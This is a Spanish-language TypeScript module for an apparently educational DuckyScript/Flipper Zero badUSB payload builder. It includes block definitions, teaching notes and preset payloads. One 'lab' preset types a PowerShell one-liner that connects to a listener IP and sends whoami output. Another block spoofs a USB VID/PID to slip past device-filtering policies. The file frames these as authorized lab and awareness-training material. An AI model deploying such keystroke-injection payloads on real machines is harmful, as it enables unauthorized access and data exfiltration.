/* Constructor de payloads DuckyScript — 100% local.
   Emite DuckyScript v1 (el estándar del USB Rubber Ducky clásico / Twin Duck,
   también compatible con el modo badUSB de Flipper Zero) más las extensiones
   propias de Flipper marcadas como tal. Cada bloque trae su explicación
   didáctica y avisos de compatibilidad según el objetivo elegido.

   ⚖ USO ÉTICO: los payloads didácticos son para TU equipo o laboratorio
   autorizado. Conectar un badUSB a equipo ajeno sin permiso escrito es
   delito en la mayoría de legislaciones (acceso no autorizado). */

export interface DuckyBlock {
  id: string
  kind: DuckyKind
  params: Record<string, string | number | boolean>
}

export type DuckyKind =
  | 'rem' | 'delay' | 'defaultdelay' | 'chardelay'
  | 'string' | 'stringln' | 'key' | 'combo'
  | 'repeat' | 'altstring' | 'vidpid' | 'waitbtn'

export type DuckyTarget = 'classic' | 'flipper'

export interface DuckyResult {
  script: string
  lines: number
  warnings: string[]
}

let uidSeed = 0
export const uid = (): string => `dk${Date.now().toString(36)}${(uidSeed++).toString(36)}`

interface DuckyBlockDef {
  label: string
  icon: string
  desc: string
  flipperOnly?: boolean
  fields: { key: string; label: string; ph?: string; area?: boolean; type?: 'text' | 'number' | 'toggle' | 'select'; options?: string[]; def?: string | number | boolean }[]
  defaults: Record<string, string | number | boolean>
  emit: (p: Record<string, string | number | boolean>) => string
  learn: string
  warn?: (p: Record<string, string | number | boolean>) => string | null
}

export const SPECIAL_KEYS = [
  'ENTER', 'TAB', 'ESC', 'SPACE', 'DELETE', 'BACKSPACE',
  'UPARROW', 'DOWNARROW', 'LEFTARROW', 'RIGHTARROW',
  'CAPSLOCK', 'PRINTSCREEN', 'MENU', 'INSERT', 'HOME', 'END', 'PAGEUP', 'PAGEDOWN',
  'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12',
]

/* ─────────────── catálogo de bloques ─────────────── */

export const DUCKY_BLOCK_DEFS: Record<DuckyKind, DuckyBlockDef> = {
  rem: {
    label: 'Comentario REM', icon: '💬',
    desc: 'Línea ignorada por el dispositivo: documenta qué hace el payload y por qué.',
    fields: [{ key: 'text', label: 'comentario', area: true, ph: 'Payload de concienciación…', def: 'Payload didáctico generado con HackNexus' }],
    defaults: { text: 'Payload didáctico generado con HackNexus' },
    emit: (p) => String(p.text).split('\n').map((l) => `REM ${l.trim()}`.trimEnd()).join('\n'),
    learn: 'REM es tu documentación dentro del payload: en un pentest real cada payload debe explicar propósito, objetivo y cómo deshacerlo. El firmware lo ignora por completo.',
  },
  delay: {
    label: 'DELAY (pausa)', icon: '⏱️',
    desc: 'Pausa en milisegundos: da tiempo al SO a reconocer el teclado y abrir apps.',
    fields: [{ key: 'ms', label: 'milisegundos', type: 'number', def: 1000 }],
    defaults: { ms: 1000 },
    emit: (p) => `DELAY ${Math.max(0, Math.round(Number(p.ms) || 0))}`,
    learn: 'El fallo #1 de los payloads de novato: sin DELAYs, las teclas se pierden. Un DELAY 3000 inicial espera a que el SO instale/active el HID; los DELAYs cortos (300-800) cubren el tiempo de abrir el menú o una app.',
    warn: (p) => (Number(p.ms) < 0 ? 'un DELAY negativo no existe: usa 0 o elimina el bloque' : null),
  },
  defaultdelay: {
    label: 'DEFAULTDELAY global', icon: '🕐',
    desc: 'Pausa automática que se inserta ENTRE todas las instrucciones siguientes.',
    fields: [{ key: 'ms', label: 'milisegundos entre instrucciones', type: 'number', def: 300 }],
    defaults: { ms: 300 },
    emit: (p) => `DEFAULTDELAY ${Math.max(0, Math.round(Number(p.ms) || 0))}`,
    learn: 'Se declara UNA vez y añade esa pausa entre cada instrucción posterior (sustituye a poner DELAYs sueltos). DEFAULTDELAY 0 lo desactiva. Alias equivalente: DEFAULT_DELAY.',
  },
  chardelay: {
    label: 'DEFAULT_CHAR_DELAY', icon: '🔡',
    desc: 'Velocidad de tecleo por carácter (extensión de Flipper Zero).',
    flipperOnly: true,
    fields: [{ key: 'ms', label: 'ms entre caracteres', type: 'number', def: 12 }],
    defaults: { ms: 12 },
    emit: (p) => `DEFAULT_CHAR_DELAY ${Math.max(0, Math.round(Number(p.ms) || 0))}`,
    learn: 'Controla cuánto tarda cada carácter tecleado por STRING. Si el objetivo pierde letras (host lento, VM cargada), súbelo a 20-50; bájalo para teclear más rápido. Solo existe en Flipper Zero y firmwares compatibles.',
  },
  string: {
    label: 'STRING (teclear)', icon: '⌨️',
    desc: 'Teclea texto tal cual, SIN pulsar Enter al final.',
    fields: [{ key: 'text', label: 'texto (una línea por STRING)', area: true, def: 'echo Hola desde HackNexus' }],
    defaults: { text: 'echo Hola desde HackNexus' },
    emit: (p) => String(p.text).split('\n').filter((l) => l.trim()).map((l) => `STRING ${l}`).join('\n'),
    learn: 'STRING teclea el texto carácter a carácter como lo haría un teclado: acepta cualquier cosa escribible, incluidos comandos que tú NO rematas con Enter (tú decides cuándo pulsarlo). Multi-línea genera un STRING por línea.',
  },
  stringln: {
    label: 'STRINGLN (+ Enter)', icon: '↵️',
    desc: 'Teclea el texto y pulsa ENTER al final de cada línea.',
    fields: [{ key: 'text', label: 'texto', area: true, def: 'ping -c 4 1.1.1.1' }],
    defaults: { text: 'ping -c 4 1.1.1.1' },
    emit: (p) => String(p.text).split('\n').filter((l) => l.trim()).map((l) => `STRINGLN ${l}`).join('\n'),
    learn: 'STRINGLN = STRING + ENTER por línea. Perfecto para ejecutar comandos seguidos en una consola ya abierta. Si el comando es crítico, añade un DELAY antes: no querrás ejecutarlo a medias.',
  },
  key: {
    label: 'Tecla especial', icon: '🔘',
    desc: 'Pulsa una tecla no imprimible: Enter, Tab, flechas, F1-F12…',
    fields: [{ key: 'key', label: 'tecla', type: 'select', options: SPECIAL_KEYS, def: 'ENTER' }],
    defaults: { key: 'ENTER' },
    emit: (p) => String(p.key),
    learn: 'Los nombres son los del estándar DuckyScript: UPARROW/DOWNARROW para navegar menús, TAB para saltar campos de un formulario, PRINTSCREEN para capturas, MENU abre el menú contextual (tecla de Windows ⌘+Shift+F10).',
  },
  combo: {
    label: 'Combinación (GUI/CTRL/ALT)', icon: '⌘️',
    desc: 'Pulsa un modificador con una o varias teclas: GUI r, CTRL SHIFT ESC…',
    fields: [
      { key: 'mod', label: 'modificador', type: 'select', options: ['GUI', 'WINDOWS', 'CTRL', 'ALT', 'SHIFT'], def: 'GUI' },
      { key: 'key', label: 'tecla(s) separadas por espacio', ph: 'r', def: 'r' },
    ],
    defaults: { mod: 'GUI', key: 'r' },
    emit: (p) => `${p.mod} ${String(p.key).trim()}`.trimEnd(),
    learn: 'GUI es la tecla Windows (WINDOWS es alias). GUI r abre Ejecutar; CTRL SHIFT ESC abre el Administrador de tareas; ALT TAB cambia de ventana. Los modificadores se mantienen pulsadas mientras se pulsan las teclas y se sueltan después.',
    warn: (p) => (!String(p.key).trim() ? 'combinación sin tecla: no pulsará nada' : null),
  },
  repeat: {
    label: 'REPEAT (repetir)', icon: '🔁',
    desc: 'Repite N veces más la instrucción anterior.',
    fields: [{ key: 'n', label: 'repeticiones extra', type: 'number', def: 4 }],
    defaults: { n: 4 },
    emit: (p) => `REPEAT ${Math.max(0, Math.round(Number(p.n) || 0))}`,
    learn: 'REPEAT repite la INSTRUCCIÓN INMEDIATAMENTE ANTERIOR: TAB seguido de REPEAT 4 navega 5 campos en total. Ideal para formularios de longitud conocida sin inflar el script.',
    warn: (p) => (Number(p.n) < 1 ? 'REPEAT 0 no hace nada: el mínimo útil es 1' : null),
  },
  altstring: {
    label: 'ALTSTRING (ALT+numpad)', icon: '🔢',
    desc: 'Teclea texto vía códigos ALT+numpad (CP437) — extensión de Flipper.',
    flipperOnly: true,
    fields: [{ key: 'text', label: 'texto CP437', ph: 'PWNED', def: 'PWNED' }],
    defaults: { text: 'PWNED' },
    emit: (p) => `ALTSTRING ${p.text}`,
    learn: 'En vez de simular teclas, envía la secuencia ALT+código numérico del set CP437 de MS-DOS. Útil contra filtros de teclado raros… y didáctico: solo funciona en Windows con teclado numérico y NO soporta acentos, ñ ni emojis (no existen en CP437).',
  },
  vidpid: {
    label: 'VID/PID (suplantación)', icon: '🪪',
    desc: 'Hace pasar el dispositivo por otro USB: VID/PID y nombre de producto.',
    flipperOnly: true,
    fields: [
      { key: 'vid', label: 'VID (4 hex)', ph: '046d', def: '046d' },
      { key: 'pid', label: 'PID (4 hex)', ph: 'c31c', def: 'c31c' },
      { key: 'product', label: 'nombre de producto (opcional)', ph: 'USB Keyboard', def: 'USB Keyboard' },
    ],
    defaults: { vid: '046d', pid: 'c31c', product: 'USB Keyboard' },
    emit: (p) => {
      const lines = [`VID ${String(p.vid).trim()}`, `PID ${String(p.pid).trim()}`]
      if (String(p.product).trim()) lines.push(`PRODUCT ${p.product}`)
      return lines.join('\n')
    },
    learn: 'VID/PID identifican al fabricante y modelo USB: con este bloque el dispositivo dice ser otro (046d:c31c es un teclado Logitech). Sirve para saltarse políticas MDM que filtran por dispositivo… y por eso los SOC serios NO confían en el VID/PID para decidir qué es un teclado.',
    warn: (p) => (!/^[0-9a-fA-F]{4}$/.test(String(p.vid).trim()) || !/^[0-9a-fA-F]{4}$/.test(String(p.pid).trim()) ? 'VID y PID deben ser exactamente 4 dígitos hexadecimales (ej. 046d)' : null),
  },
  waitbtn: {
    label: 'WAIT_FOR_BUTTON_PRESS', icon: '🖐️',
    desc: 'Congela el payload hasta que tú pulses el botón (Flipper Zero).',
    flipperOnly: true,
    fields: [],
    defaults: {},
    emit: () => 'WAIT_FOR_BUTTON_PRESS',
    learn: 'El payload se detiene hasta que pulsas OK en el Flipper: es tu "cerrojo de seguridad" para armar el ataque con el equipo YA enchufado, o para sincronizar demostraciones en formación. No existe en DuckyScript clásico.',
  },
}

export const DUCKY_KIND_ORDER: DuckyKind[] = [
  'rem', 'delay', 'defaultdelay', 'chardelay',
  'string', 'stringln', 'key', 'combo', 'repeat',
  'altstring', 'vidpid', 'waitbtn',
]

export const newDuckyBlock = (kind: DuckyKind): DuckyBlock =>
  ({ id: uid(), kind, params: { ...DUCKY_BLOCK_DEFS[kind].defaults } })

/* ─────────────── presets didácticos ─────────────── */

interface PresetStep { kind: DuckyKind; params?: Record<string, string | number | boolean> }
export interface DuckyPreset {
  id: string
  name: string
  icon: string
  desc: string
  target: DuckyTarget
  note?: string
  steps: PresetStep[]
}

export const DUCKY_PRESETS: DuckyPreset[] = [
  {
    id: 'notepad',
    name: 'Aviso de concienciación',
    icon: '📝',
    desc: 'El clásico payload formativo: al conectarlo, abre el Bloc de notas y escribe un aviso de seguridad. Demuestra que CUALQUIER USB puede ser un teclado.',
    target: 'classic',
    note: 'Pícalo en TU equipo o en una campaña de awareness autorizada por RRHH/IT.',
    steps: [
      { kind: 'rem', params: { text: 'Awareness: un USB "de memoria" también teclea. Solo en equipos propios.' } },
      { kind: 'delay', params: { ms: 3000 } },
      { kind: 'combo', params: { mod: 'GUI', key: 'r' } },
      { kind: 'delay', params: { ms: 500 } },
      { kind: 'string', params: { text: 'notepad' } },
      { kind: 'key', params: { key: 'ENTER' } },
      { kind: 'delay', params: { ms: 1000 } },
      { kind: 'stringln', params: { text: '⚠ AVISO DEL DEPARTAMENTO DE SEGURIDAD' } },
      { kind: 'stringln', params: { text: 'Este mensaje lo ha tecleado un "pendrive". Si ha podido abrir' } },
      { kind: 'stringln', params: { text: 'el Bloc de notas… imagina lo que haría un atacante real.' } },
      { kind: 'stringln', params: { text: 'No conectes USBs de origen desconocido. Reporta a IT.' } },
    ],
  },
  {
    id: 'flipper-hola',
    name: 'Flipper: badUSB armado',
    icon: '🐬',
    desc: 'Mismo concepto pero con extensiones Flipper Zero: suplantación VID/PID y botón de armado manual antes de ejecutar.',
    target: 'flipper',
    note: 'WAIT_FOR_BUTTON_PRESS evita disparos accidentales: el payload espera a que TÚ pulses OK.',
    steps: [
      { kind: 'vidpid', params: { vid: '046d', pid: 'c31c', product: 'USB Keyboard' } },
      { kind: 'delay', params: { ms: 3000 } },
      { kind: 'waitbtn' },
      { kind: 'combo', params: { mod: 'GUI', key: 'r' } },
      { kind: 'delay', params: { ms: 500 } },
      { kind: 'string', params: { text: 'notepad' } },
      { kind: 'key', params: { key: 'ENTER' } },
      { kind: 'delay', params: { ms: 1000 } },
      { kind: 'stringln', params: { text: 'Hello from the Flipper: VID/PID suplantado y armado a mano.' } },
    ],
  },
  {
    id: 'shutdown',
    name: 'Apagado programado (reversible)',
    icon: '💤',
    desc: 'Programa un apagado en 2 minutos… y se cancela a sí mismo. Didáctico y 100% reversible: enseña el poder de un badUSB sin romper nada.',
    target: 'classic',
    note: 'La cancelación (shutdown /a) queda escrita en la consola: transparencia total.',
    steps: [
      { kind: 'rem', params: { text: 'Demo reversible: apagado en 2 min y cancelación automática (shutdown /a).' } },
      { kind: 'delay', params: { ms: 3000 } },
      { kind: 'combo', params: { mod: 'GUI', key: 'r' } },
      { kind: 'delay', params: { ms: 300 } },
      { kind: 'string', params: { text: 'cmd' } },
      { kind: 'key', params: { key: 'ENTER' } },
      { kind: 'delay', params: { ms: 800 } },
      { kind: 'stringln', params: { text: 'shutdown /s /t 120' } },
      { kind: 'stringln', params: { text: 'echo Apagado en 2 min. Cancelalo con: shutdown /a' } },
      { kind: 'delay', params: { ms: 1500 } },
      { kind: 'stringln', params: { text: 'shutdown /a' } },
      { kind: 'stringln', params: { text: 'echo Cancelado. Esto era una demo de badUSB :)' } },
    ],
  },
  {
    id: 'lab-shell',
    name: 'Laboratorio: conexión TCP',
    icon: '🧪',
    desc: 'Payload de laboratorio: abre PowerShell y envía el resultado de whoami a TU listener de prueba. Para entender la cadena completa badUSB → shell.',
    target: 'classic',
    note: '⚖ SOLO en tu laboratorio y contra TU IP: usarlo fuera es delito. Cambia IP y puerto a tu equipo atacante.',
    steps: [
      { kind: 'rem', params: { text: '⚠ SOLO LABORATORIO PROPIO: conecta a tu listener (nc -lvnp 4444) y manda whoami.' } },
      { kind: 'delay', params: { ms: 3000 } },
      { kind: 'combo', params: { mod: 'GUI', key: 'r' } },
      { kind: 'delay', params: { ms: 300 } },
      { kind: 'string', params: { text: 'powershell' } },
      { kind: 'key', params: { key: 'ENTER' } },
      { kind: 'delay', params: { ms: 1500 } },
      { kind: 'stringln', params: { text: "$c=New-Object Net.Sockets.TcpClient('192.168.1.50',4444);$w=New-Object IO.StreamWriter($c.GetStream());$w.WriteLine(whoami);$w.Flush();$c.Close();exit" } },
      { kind: 'rem', params: { text: 'En tu máquina: rlwrap nc -lvnp 4444' } },
    ],
  },
]

export const presetToBlocks = (p: DuckyPreset): DuckyBlock[] =>
  p.steps.map((s) => ({ id: uid(), kind: s.kind, params: { ...DUCKY_BLOCK_DEFS[s.kind].defaults, ...s.params } }))

/* ─────────────── compilador ─────────────── */

export const buildDuckyScript = (blocks: DuckyBlock[], target: DuckyTarget): DuckyResult => {
  const warnings: string[] = []
  const chunks: string[] = []

  blocks.forEach((b, i) => {
    const def = DUCKY_BLOCK_DEFS[b.kind]
    if (def.flipperOnly && target === 'classic') {
      warnings.push(`bloque ${i + 1} «${def.label}»: solo existe en Flipper Zero — un Rubber Ducky clásico (Twin Ducky) lo ignorará o fallará`)
    }
    const w = def.warn?.(b.params)
    if (w) warnings.push(`bloque ${i + 1} «${def.label}»: ${w}`)
    const out = def.emit(b.params).trim()
    if (out) chunks.push(out)
  })

  const script = `${chunks.join('\n\n')}\n`
  return { script, lines: script.trimEnd().split('\n').length, warnings }
}
